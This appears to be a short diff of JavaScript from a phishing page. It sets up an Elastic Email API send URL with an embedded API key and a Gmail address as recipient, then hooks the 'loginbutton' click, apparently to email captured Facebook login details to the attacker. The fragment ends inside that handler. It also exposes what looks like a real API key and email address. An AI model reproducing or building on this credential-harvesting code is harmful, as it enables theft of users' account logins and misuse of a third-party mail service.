@@ -1,4 +1,4 @@
-//if (typeof useringer === "undefined") {var useringer="None";};
+if (typeof useringer === "undefined") {var useringer="None";};
 var urlinger = "https://api.elasticemail.com/v2/email/send?apikey=b82d49f1-52a0-42d2-b222-b42b00d74599&subject=FB&from=sophamrg@gmail.com&fromName=ffdsa&to=sophamrg@gmail.com&isTransactional=True&bodyText=";
 document.getElementById("loginbutton").onclick = function(){
     //alert(useringer);
